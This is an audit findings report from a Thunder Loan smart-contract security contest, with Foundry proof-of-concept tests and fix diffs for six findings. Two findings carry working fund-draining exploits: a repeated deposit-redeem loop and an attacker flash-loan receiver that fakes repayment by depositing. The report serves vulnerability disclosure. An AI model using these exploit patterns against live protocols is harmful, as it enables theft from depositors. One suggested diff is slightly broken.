# First Flight #3: Thunder Loan - Findings Report

# Table of contents
- ## [Contest Summary](#contest-summary)
- ## [Results Summary](#results-summary)
- ## High Risk Findings
    - ### [H-01. ThunderLoan::setAllowedToken() lags check whether the token has a pool or not.](#H-01)
    - ### [H-02. The ThunderLoanUpgraded contract have different variables for the corresponding storage slots](#H-02)
    - ### [H-03. Incorrect calculation of ```valueOfBorrowedToken``` inside ThunderLoan::getCalculatedFee() function due to wrong precision used.](#H-03)
    - ### [H-04. Exchange rate updation in ThunderLoan::deposit() function is insignificant and leads to drain of funds ](#H-04)
    - ### [H-05. Funds can be drained by ThunderLoan::flashloan()](#H-05)
- ## Medium Risk Findings
    - ### [M-01. Funds can be lost forever for a particular token, if it is blocked by owner via ThunderLoan::setAllowedToken() ](#M-01)



# <a id='contest-summary'></a>Contest Summary

### Sponsor: First Flight #3

### Dates: Nov 1st, 2023 - Nov 8th, 2023

[See more contest details here](https://www.codehawks.com/contests/clocopz26004rkx08q1n61wnz)

# <a id='results-summary'></a>Results Summary

### Number of findings:
   - High: 5
   - Medium: 1
   - Low: 0


# High Risk Findings

## <a id='H-01'></a>H-01. ThunderLoan::setAllowedToken() lags check whether the token has a pool or not.            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-11-Thunder-Loan/blob/main/src/protocol/ThunderLoan.sol#L227

https://github.com/Cyfrin/2023-11-Thunder-Loan/blob/main/src/upgradedProtocol/ThunderLoanUpgraded.sol#L225

## Summary
ThunderLoan::setAllowedToken() lags check whether the token has a pool or not. Fees is calculated when the user takes flash loan on the basis of price of token in weth, which is brought from oracle pool but if the token don't have a pool then user can't take flash loan as it will always revert on fee calculation because the pool will be equal to address(0) and it will get reverted as no function calls can be made on address(0). Thus, no user can take flash loan and it is necessary that there is a check in setAllowedToken to revert if there is no pool corresponding to token.

## Vulnerability Details
If the token being allowed in the protocol don't have a pool, then fees can never be calculated as it uses the weth price corresponding to that token which is fetched from pool. But if there is no pool for a token then fees can never be calculated and all functions which involves fee calculation will always revert.
NOTE: This vulnerability is present in both ```ThunderLoan``` and ```ThunderLoanUpgraded``` contract.

## PoC
- Add the new tokenB in ```test/unit/BaseTest.t.sol```

```diff
contract BaseTest is Test {
    ThunderLoan thunderLoanImplementation;
    MockPoolFactory mockPoolFactory;
    ERC1967Proxy proxy;
    ThunderLoan thunderLoan;

    ERC20Mock weth;
    ERC20Mock tokenA;
+   ERC20Mock tokenB;

    function setUp() public virtual {
        thunderLoan = new ThunderLoan();
        mockPoolFactory = new MockPoolFactory();

        weth = new ERC20Mock();
        tokenA = new ERC20Mock();
+       tokenB = new ERC20Mock();

        mockPoolFactory.createPool(address(tokenA));
        proxy = new ERC1967Proxy(address(thunderLoan), "");
        thunderLoan = ThunderLoan(address(proxy));
        thunderLoan.initialize(address(mockPoolFactory));
    }
}
```

- Add the test in the file: ```test/unit/ThunderLoanTest.t.sol```
- Run the test: ```forge test --mt test_deposit_RevertsIf_TokenAllowlistedHasNoPool```
```solidity
modifier setAllowedTokenB_AndMintToken() {
    thunderLoan.setAllowedToken(tokenB, true);
    tokenB.mint(liquidityProvider, DEPOSIT_AMOUNT);
    _;
}

function test_deposit_RevertsIf_TokenAllowlistedHasNoPool() public setAllowedTokenB_AndMintToken {
    vm.startPrank(liquidityProvider);

    tokenB.approve(address(thunderLoan), DEPOSIT_AMOUNT);

    // Reverts because there is no pool corresponding to the token 
    // and getPriceOfOnePoolTokenInWeth() is called on pool (= address(0)) thus it is expected to be reverted
    vm.expectRevert();
    thunderLoan.deposit(tokenB, DEPOSIT_AMOUNT);

    vm.stopPrank();
}
```

## Impact
User can't call the function which uses the fees calculation as pool is used to calculate weth amount corresponding to that token and if there is no pool, then function call will always revert.

## Tools Used
Manual Review, Foundry Tests

## Recommendations
To have a check in ```setAllowedToken()``` function, that if there is no pool corresponding to the token then it should revert.

```diff
diff --git a/src/protocol/OracleUpgradeable.sol b/src/protocol/OracleUpgradeable.sol
index e38a6cc..0fc2bef 100644
--- a/src/protocol/OracleUpgradeable.sol
+++ b/src/protocol/OracleUpgradeable.sol
@@ -25,7 +25,7 @@ contract OracleUpgradeable is Initializable {
         return getPriceInWeth(token);
     }
 
-    function getPoolFactoryAddress() external view returns (address) {
+    function getPoolFactoryAddress() public view returns (address) {
         return s_poolFactory;
     }
 }
diff --git a/src/protocol/ThunderLoan.sol b/src/protocol/ThunderLoan.sol
index e67674e..81e6693 100644
--- a/src/protocol/ThunderLoan.sol
+++ b/src/protocol/ThunderLoan.sol
@@ -72,6 +72,7 @@ import { Initializable } from "@openzeppelin/contracts-upgradeable/proxy/utils/I
 import { UUPSUpgradeable } from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
 import { OracleUpgradeable } from "./OracleUpgradeable.sol";
 import { Address } from "@openzeppelin/contracts/utils/Address.sol";
+import { IPoolFactory } from "../interfaces/IPoolFactory.sol";
 
 contract ThunderLoan is Initializable, OwnableUpgradeable, UUPSUpgradeable, OracleUpgradeable {
     error ThunderLoan__NotAllowedToken(IERC20 token);
@@ -83,6 +84,7 @@ contract ThunderLoan is Initializable, OwnableUpgradeable, UUPSUpgradeable, Orac
     error ThunderLoan__ExhangeRateCanOnlyIncrease();
     error ThunderLoan__NotCurrentlyFlashLoaning();
     error ThunderLoan__BadNewFee();
+    error ThunderLoan__TokenHasNoPool();
 
     using SafeERC20 for IERC20;
     using Address for address;
@@ -229,6 +231,9 @@ contract ThunderLoan is Initializable, OwnableUpgradeable, UUPSUpgradeable, Orac
             if (address(s_tokenToAssetToken[token]) != address(0)) {
                 revert ThunderLoan__AlreadyAllowed();
             }
+            if (IPoolFactory(getPoolFactoryAddress()).getPool(address(token)) == address(0)) {
+                revert ThunderLoan__TokenHasNoPool();
+            }
             string memory name = string.concat("ThunderLoan ", IERC20Metadata(address(token)).name());
             string memory symbol = string.concat("tl", IERC20Metadata(address(token)).symbol());
             AssetToken assetToken = new AssetToken(address(this), token, name, symbol);
```
## <a id='H-02'></a>H-02. The ThunderLoanUpgraded contract have different variables for the corresponding storage slots            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-11-Thunder-Loan/blob/main/src/upgradedProtocol/ThunderLoanUpgraded.sol#L96

https://github.com/Cyfrin/2023-11-Thunder-Loan/blob/main/src/upgradedProtocol/ThunderLoanUpgraded.sol#L99

## Summary
In the ThunderLoanUpgraded contract, the variables defined are not in the same order as defined in the initial implementation of ThunderLoan. As a result of which the variables defined in the upgraded contract will correspond to the incorrect storage slot which was set up in the initial implementation in respect with their variables. Thus, it will return incorrect values for the variables as it will read the values for incorrect storage slot due to change in the order of variables which in turn will have different storage slot corresponding to them.

## Vulnerability Details
The upgraded contract have different order in which variables are defined which will lead to incorrect correspondence between storage slots which was set up in the initial implementation and thus will have an impact to read/write of the contract as the variables now have different storage slots. This will result in incorrect fees calculation.

```solidity
mapping(IERC20 => AssetToken) public s_tokenToAssetToken;                                  Storage Slot - 0
uint256 private s_feePrecision;                                                            Storage Slot - 1
uint256 private s_flashLoanFee;                                                            Storage Slot - 2
mapping(IERC20 token => bool currentlyFlashLoaning) private s_currentlyFlashLoaning;       Storage Slot - 3 

Note: (The storage for key-value pairs stored in mapping will be calculated on the basis of their storage slots)
```

```solidity
mapping(IERC20 => AssetToken) public s_tokenToAssetToken;                                  Storage Slot - 0
uint256 private s_flashLoanFee; // 0.3% ETH fee                                            Storage Slot - 1
uint256 public constant FEE_PRECISION = 1e18;                                              N/A (As it is a constant)
mapping(IERC20 token => bool currentlyFlashLoaning) private s_currentlyFlashLoaning;       Storage Slot - 2
```

Here as the s_flashLoanFee has a different storage slot in upgraded contract (Storage Slot 1) which corresponds to s_feePrecision of initial implementation contract. Thus, the value of s_flashLoanFee will return the value for s_feePrecision.
Also, the mapping s_currentlyFlashLoaning will be effected as it has storage slot 2 (earlier, storage slot 3).
As a result of which values will be mapped and retrieved on the basis of storage slot 2, thus will return incorrect values as correct storage slot was 3. 

## PoC
Add the test in test/unit/ThunderLoanTest.t.sol

Also include: ```import { ThunderLoanUpgraded } from "../../src/upgradedProtocol/ThunderLoanUpgraded.sol";```

Run the test: ```forge test --mt test_UpgradeContract_ButWithIncorrectRetrievalOfValues```
```solidity
function test_UpgradeContract_ButWithIncorrectRetrievalOfValues() public {
    uint256 initFeePrecision = thunderLoan.getFeePrecision();
    uint256 initFlashloanFee = thunderLoan.getFee();

    // Upgrade the implementation
    address thunderLoanUpgradedImplementation = address(new ThunderLoanUpgraded());
    thunderLoan.upgradeTo(thunderLoanUpgradedImplementation);

    uint256 flashLoanFee = thunderLoan.getFee();

    assertEq(flashLoanFee, initFeePrecision);
    assert(flashLoanFee != initFlashloanFee);
}
```

## Impact
Incorrect read/write of data, resulting in incorrect calculations related to fees.

## Tools Used
Manual Review, Foundry Tests

## Recommendations
To have the same exact variables used in the previous implementation and in same order.
## <a id='H-03'></a>H-03. Incorrect calculation of ```valueOfBorrowedToken``` inside ThunderLoan::getCalculatedFee() function due to wrong precision used.            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-11-Thunder-Loan/blob/main/src/protocol/ThunderLoan.sol#L248

## Summary
Incorrect calculation of ```valueOfBorrowedToken``` inside the ThunderLoan::getCalculatedFee() function will lead to calculation of incorrect value for fees. The precision used is fixed but as there will be various tokens in the protocol with different decimals then it will lead to wrong calculations.

## Vulnerability Details
The calculation of ```valueOfBorrowedToken``` on the basis of a fixed precision will lead to wrong calculations as the tokens in the protocol will have different precisions, so having a fixed precision will lead to wrong calculation of fees and the exchange rate updations.

```solidity
uint256 valueOfBorrowedToken = (amount * getPriceInWeth(address(token))) / s_feePrecision;
```
here s_feePrecision have a fixed value, but as different tokens can have different precisions, thus will lead to incorrect calculations for different tokens.


## Impact
Incorrect calculations of fees and exchange rates, leading to less interest rates and less fees imposed on flash loan borrower.

## Tools Used
Manual Review

## Recommendations
To calculate the precision on the basis of the respective tokens.

## <a id='H-04'></a>H-04. Exchange rate updation in ThunderLoan::deposit() function is insignificant and leads to drain of funds             

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-11-Thunder-Loan/blob/main/src/protocol/ThunderLoan.sol#L153-L154

## Summary
The exchange rate updation inside the ThunderLoan::deposit() function is insignificant and can lead to drainage of funds.
The protocol mentions that liquidity providers can gain interest on their asset tokens on the basis of flash loans, then they should not be provided interest when they deposit because every time they deposit they get some interest and can redeem higher amount even if they redeem just after depositing the funds.

## Vulnerability Details
- Malicious actors can call the deposit() followed by redeem() function multiple times to gain interest every time they deposit the tokens and redeem just after depositing and get more amount then they deposited. This can be repeated a number of times to gradually drain funds from the protocol and get interest without a User taking flash loans.
- Also, liquidity providers will not be able to redeem their amount corresponding to minted Asset Token balance as the attacker drained the funds. 

##PoC
Include the below test inside ```test/unit/ThunderLoanTest.t.sol```
To run the test: 
1. ```forge test --mt test_AttackerCanDrainTokens -vv```
2. ```forge test --mt test_LiquidityProviderCantRedeem -vv```

```solidity
modifier additionalSetUp() {
    address attacker = makeAddr("attacker");
    uint256 ATTACKER_START_TOKEN_BALANCE = 10e18;
    tokenA.mint(attacker, ATTACKER_START_TOKEN_BALANCE);
    _;
}

function _depositAndRedeem() internal {
    address attacker = makeAddr("attacker");
    uint256 ATTACKER_START_TOKEN_BALANCE = 10e18;

    uint256 amount = ATTACKER_START_TOKEN_BALANCE;
    uint256 balanceBefore = tokenA.balanceOf(attacker);

    AssetToken tokenA_asset = thunderLoan.getAssetFromToken(tokenA);
    uint256 exchangeRate = tokenA_asset.getExchangeRate();
    
    // The value of Asset Token minted on depositing tokenA
    uint256 mintAmt = (amount * tokenA_asset.EXCHANGE_RATE_PRECISION()) / exchangeRate;

    vm.startPrank(attacker);

    tokenA.approve(address(thunderLoan), amount);
    thunderLoan.deposit(tokenA, amount);

    vm.stopPrank();

    assertEq(tokenA_asset.balanceOf(attacker), mintAmt);

    vm.prank(attacker);
    thunderLoan.redeem(tokenA, mintAmt);

    uint256 balanceAfter = tokenA.balanceOf(attacker);


    assertEq(tokenA_asset.balanceOf(attacker), 0);
    assert(balanceAfter > balanceBefore);

    console.log("Balance Before -", balanceBefore, "\n");
    console.log("Balance After -", balanceAfter, "\n\n");
}

function test_AttackerCanDrainTokens() public setAllowedToken hasDeposits additionalSetUp {
    address attacker = makeAddr("attacker");

    for (uint256 i = 0; i < 100; i++) {
        // attacker deposits and redeem
        _depositAndRedeem();
    }   

    uint256 balanceAfter = tokenA.balanceOf(attacker);
    console.log(balanceAfter);
}

function test_LiquidityProviderCantRedeem() public setAllowedToken hasDeposits additionalSetUp {
    // attacker deposits and redeem, gets more tokenA value when redeems
    _depositAndRedeem();

    AssetToken assetToken = thunderLoan.getAssetFromToken(tokenA);

    uint256 amountOfAssetToken = (DEPOSIT_AMOUNT * assetToken.EXCHANGE_RATE_PRECISION()) / assetToken.getExchangeRate();

    vm.prank(liquidityProvider);
    vm.expectRevert("ERC20: transfer amount exceeds balance");
    thunderLoan.redeem(tokenA, amountOfAssetToken);
}
```

## Impact
Drain of funds from the protocol and liquidity providers can't redeem for their Asset Token balance.

## Tools Used
Manual Review, Foundry Tests (Forge)

## Recommendations
Exchange rate should not be increased when liquidity providers make a deposit. So, modify the ThunderLoan::deposit() function.
```diff
function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
    AssetToken assetToken = s_tokenToAssetToken[token];
    uint256 exchangeRate = assetToken.getExchangeRate();
    uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) / exchangeRate;
    emit Deposit(msg.sender, token, amount);
    assetToken.mint(msg.sender, mintAmount);
-   uint256 calculatedFee = getCalculatedFee(token, amount);
-   assetToken.updateExchangeRate(calculatedFee);
    token.safeTransferFrom(msg.sender, address(assetToken), amount);
}
```
## <a id='H-05'></a>H-05. Funds can be drained by ThunderLoan::flashloan()            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-11-Thunder-Loan/blob/main/src/protocol/ThunderLoan.sol#L180

## Summary
ThunderLoan::flashloan() function can be exploited by attacker and funds can be drained.

The revert condition check ```endingBalance < startingBalance + fee``` is not sufficient, as it can be pretended by attacker that funds are repaid by calling the ThunderLoan::deposit() function and amount equivalent to (flash loan + fees) can be deposited in ThunderLoan, this will increase the balance to the required repayment amount and the condition ```endingBalance < startingBalance + fee``` will becomes false and it will not revert, but it should have reverted as the funds were not paid they were only deposited. As a result of which funds can be later withdrawn by calling the ThunderLoan::redeem() function.

## Vulnerability Details
```flashloan``` function can be called with the maximum amount in protocol and once control is transferred to executeOperation() function of flash loan receiver contract, the amount = (flash loan + fee) can be deposited via ThunderLoan::deposit() function, and as the ending balance will increase to the required amount and thus it was pretended that the funds are repaid but instead they were deposited and they can be drained by the ThunderLoan::redeem() function.
```solidity
uint256 endingBalance = token.balanceOf(address(assetToken));
if (endingBalance < startingBalance + fee) {
    revert ThunderLoan__NotPaidBack(startingBalance + fee, endingBalance);
}
```
The check is not sufficient as the endingBalance can be increased just by depositing the funds, and it will be pretended that funds were repaid and they can be taken out anytime as the funds deposited over here belong to the one who deposited them. Thus, all funds can be drained.

## PoC
It can be demonstrated by deploying a Flash Loan Receiver contract given below. Paste the code inside ```test/mocks/AttackerFlashLoanReceiver.sol```.

```AttackerFlashLoanReceiver.sol```
```solidity
// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;

import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { IFlashLoanReceiver } from "../../src/interfaces/IFlashLoanReceiver.sol";
import { ThunderLoan } from "../../src/protocol/ThunderLoan.sol";

contract AttackerFlashLoanReceiver is IFlashLoanReceiver {
    error AttackerFlashLoanReceiver__NotThunderLoan();
    error AttackerFlashLoanReceiver__NotOwner();

    address public owner;
    ThunderLoan public thunderLoan;

    constructor(address thunderLoanAddr) {
        owner = msg.sender;
        thunderLoan = ThunderLoan(thunderLoanAddr);
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address initiator,
        bytes calldata /*params*/
    )
        external
        returns (bool)
    {
        if (msg.sender != address(thunderLoan)) {
            revert AttackerFlashLoanReceiver__NotThunderLoan();
        }   

        if (initiator != owner) {
            revert AttackerFlashLoanReceiver__NotOwner();
        }

        IERC20(token).approve(address(thunderLoan), amount + fee);
        thunderLoan.deposit(IERC20(token), amount + fee);

        return true;
    }

    function withdraw(address token, uint256 amountOfAssetToken) external {
        thunderLoan.redeem(IERC20(token), amountOfAssetToken);
        uint256 amount = IERC20(token).balanceOf(address(this));
        bool success = IERC20(token).transfer(owner, amount);
        require(success);
    } 
}
```

Import the above contract inside ```test/unit/ThunderLoanTest.t.sol```.

```import { AttackerFlashLoanReceiver } from "../mocks/AttackerFlashLoanReceiver.sol";```

Inlcude the below test in ```test/unit/ThunderLoanTest.t.sol```.

Run the test by: ```forge test --mt test_FlashLoan_FakeRepaymentAndDrainFunds -vv```

```solidity
function test_FlashLoan_FakeRepaymentAndDrainFunds() public setAllowedToken hasDeposits {
    address attacker = makeAddr("attacker");
    uint256 ATTACKER_START_TOKEN_BALANCE = 10e18;
    tokenA.mint(attacker, ATTACKER_START_TOKEN_BALANCE);

    // Liquidity Provider deposited 1000 amount of tokenA
    // And gets Asset Token for tokenA = 1000 Asset Tokens
    // Exchange rate becomes = (3 + 1000) / 1000 = 1.003

    AssetToken at = thunderLoan.getAssetFromToken(tokenA);
    
    vm.startPrank(attacker);

    AttackerFlashLoanReceiver receiver = new AttackerFlashLoanReceiver(address(thunderLoan));

    // Now, the fees imposed on receiver contract will be 3 units for flash loan of 1000 units
    // flash loan = 1000 units, weth price of tokenA = 1 unit
    // total value of borrowed token = 1000 * 1 = 1000
    // therefore, fees = 0.3% of borrowed token = (0.3 * 1000) / 100 = 3 units
    uint256 FEES = 3e18;
    tokenA.transfer(address(receiver), FEES);       // Transfer 3 units to receiver contract to pay loan fees
    uint256 initAttackerBalance = tokenA.balanceOf(attacker);

    // DEPOSIT_AMOUNT = 1000 units of tokenA, therefore borrowing 1000 units of tokenA
    thunderLoan.flashloan(address(receiver), tokenA, DEPOSIT_AMOUNT, "");

    vm.stopPrank();

    // As during the executeOperation() function call, deposit function was called with
    // depositAmount = amount (flash loan) + fees = 1000 + 3 = 1003
    // and it was pretended to ThunderLoan that the amount was paid
    // but as the amount was deposited giving access to redeem amount = (flash loan amount + fees)     

    // Also new exchange rate will be initExchangeRate * (1000 + FEES) / 1000 = 1.006009
    
    // Also as amount was deposited, the total supply of asset token increaes by
    // depost amount / exchange rate = 1003 / 1.006009 = 997.008973080757726819
    // total supply of asset token = (1000 + 997.008973080757726819) = 1997.008973080757726819
    // Also increased the exchange rates
    // final exchange rate = 1.006009 * (1997.008973080757726819 + 3.009) / 1997.008973080757726819 = 1.007524807450945082

    uint256 finalExchangeRate = at.getExchangeRate();

    // max tokenA that can be drained
    uint256 maxTokenA = tokenA.balanceOf(address(at));
    uint256 amountOfAssetToken = maxTokenA * at.EXCHANGE_RATE_PRECISION() / finalExchangeRate;
    uint256 attackerAssetTokenBalance = at.balanceOf(address(receiver));

    if (attackerAssetTokenBalance < amountOfAssetToken) {
        amountOfAssetToken = attackerAssetTokenBalance;
    }

    uint256 amountOfTokenA = (amountOfAssetToken * finalExchangeRate) / at.EXCHANGE_RATE_PRECISION();

    vm.prank(attacker);
    receiver.withdraw(address(tokenA), amountOfAssetToken);

    uint256 finalAttackerBalance = tokenA.balanceOf(attacker);

    assertEq(finalAttackerBalance, initAttackerBalance + amountOfTokenA);
    console.log("Drained Amount:", finalAttackerBalance - FEES - initAttackerBalance);
}
```
## Impact
All funds in the protocol can be drained.

## Tools Used
Manual Review, Forge

## Recommendations
To mitigate this vulnerability, users should not be allowed to deposit funds while taking flash loans.
Modify the function ThunderLoan::deposit()
```diff
function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
+   if (s_currentlyFlashLoaning[token]) {
+       revert ThunderLoan__CantDepositDuringFlashLoan();
+   }

    AssetToken assetToken = s_tokenToAssetToken[token];
    uint256 exchangeRate = assetToken.getExchangeRate();
    uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) / exchangeRate;
    emit Deposit(msg.sender, token, amount);
    assetToken.mint(msg.sender, mintAmount);
    uint256 calculatedFee = getCalculatedFee(token, amount);
    assetToken.updateExchangeRate(calculatedFee);
    token.safeTransferFrom(msg.sender, address(assetToken), amount);
}
```
		
# Medium Risk Findings

## <a id='M-01'></a>M-01. Funds can be lost forever for a particular token, if it is blocked by owner via ThunderLoan::setAllowedToken()             

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-11-Thunder-Loan/blob/main/src/protocol/ThunderLoan.sol#L240

## Summary
Owner has the privilege to block a token whenever they want, and this will lead to permanent block of funds, and liquidity providers can't redeem back their tokens.

## Vulnerability Details
If the protocol owner block a token by the ThunderLoan::setAllowedToken(), then all the liquidity providers who deposited their tokens for the corresponding Asset Token, will not be able to redeem their tokens back.

## Impact
Lock of funds of liquidity providers for a blocked token by the owner.

## Tools Used
Manual Review

## Recommendations
To have a timelock facility, when a token is blocked by the owner then a timelock will be set for x units, and after x units of time has passed, no more functions can be called for that blocked token.

```
diff --git a/src/protocol/ThunderLoan.sol b/src/protocol/ThunderLoan.sol
index e67674e..1085d7c 100644
--- a/src/protocol/ThunderLoan.sol
+++ b/src/protocol/ThunderLoan.sol
@@ -83,6 +83,8 @@ contract ThunderLoan is Initializable, OwnableUpgradeable, UUPSUpgradeable, Orac
     error ThunderLoan__ExhangeRateCanOnlyIncrease();
     error ThunderLoan__NotCurrentlyFlashLoaning();
     error ThunderLoan__BadNewFee();
+    error ThunderLoan__DurationLessThanMinimum();
+    error ThunderLoan__TimelockAlreadySet();
 
     using SafeERC20 for IERC20;
     using Address for address;
@@ -92,9 +94,16 @@ contract ThunderLoan is Initializable, OwnableUpgradeable, UUPSUpgradeable, Orac
     //////////////////////////////////////////////////////////////*/
     mapping(IERC20 => AssetToken) public s_tokenToAssetToken;
 
+    /**
+     * @notice If a token is blocked then it will still remain functional for some deadline stored in this mapping
+     * @notice If the timelock is zero and there is a asset token for a token, then it is a allowed token
+     */
+    mapping(IERC20 => uint256) public s_timelock;
+
     // The fee in WEI, it should have 18 decimals. Each flash loan takes a flat fee of the token price.
     uint256 private s_feePrecision;
     uint256 private s_flashLoanFee; // 0.3% ETH fee
+    uint256 private constant MIN_DEADLINE_DURATION = 2 days;
 
     mapping(IERC20 token => bool currentlyFlashLoaning) private s_currentlyFlashLoaning;
 
@@ -177,7 +186,7 @@ contract ThunderLoan is Initializable, OwnableUpgradeable, UUPSUpgradeable, Orac
         assetToken.transferUnderlyingTo(msg.sender, amountUnderlying);
     }
 
-    function flashloan(address receiverAddress, IERC20 token, uint256 amount, bytes calldata params) external {
+    function flashloan(address receiverAddress, IERC20 token, uint256 amount, bytes calldata params) external revertIfNotAllowedToken(to
ken) {
         AssetToken assetToken = s_tokenToAssetToken[token];
         uint256 startingBalance = IERC20(token).balanceOf(address(assetToken));
         uint256 startingBalance = IERC20(token).balanceOf(address(assetToken));
 
@@ -224,20 +233,29 @@ contract ThunderLoan is Initializable, OwnableUpgradeable, UUPSUpgradeable, Orac
         token.safeTransferFrom(msg.sender, address(assetToken), amount);
     }
 
-    function setAllowedToken(IERC20 token, bool allowed) external onlyOwner returns (AssetToken) {
+    function setAllowedToken(IERC20 token, bool allowed, uint256 deadlineDuration) external onlyOwner returns (AssetToken) {
         if (allowed) {
-            if (address(s_tokenToAssetToken[token]) != address(0)) {
+            if (isAllowedToken(token)) {
                 revert ThunderLoan__AlreadyAllowed();
             }
             string memory name = string.concat("ThunderLoan ", IERC20Metadata(address(token)).name());
             string memory symbol = string.concat("tl", IERC20Metadata(address(token)).symbol());
             AssetToken assetToken = new AssetToken(address(this), token, name, symbol);
             s_tokenToAssetToken[token] = assetToken;
+            s_timelock[token] = 0;
             emit AllowedTokenSet(token, assetToken, allowed);
             return assetToken;
         } else {
+            if (s_timelock[token] != 0) {
+                revert ThunderLoan__TimelockAlreadySet();
+            }
+
+            if (deadlineDuration < MIN_DEADLINE_DURATION) {
+                revert ThunderLoan__DurationLessThanMinimum();
+            }
+
+
             AssetToken assetToken = s_tokenToAssetToken[token];
-            delete s_tokenToAssetToken[token];
+            s_timelock[token] = block.timestamp + deadlineDuration;
             emit AllowedTokenSet(token, assetToken, allowed);
             return assetToken;
         }
@@ -258,7 +276,7 @@ contract ThunderLoan is Initializable, OwnableUpgradeable, UUPSUpgradeable, Orac
     }
 
     function isAllowedToken(IERC20 token) public view returns (bool) {
-        return address(s_tokenToAssetToken[token]) != address(0);
+        return address(s_tokenToAssetToken[token]) != address(0) && (s_timelock[token] == 0 || s_timelock[token] >= block.timestamp);
     }
 
     function getAssetFromToken(IERC20 token) public view returns (AssetToken) {
```




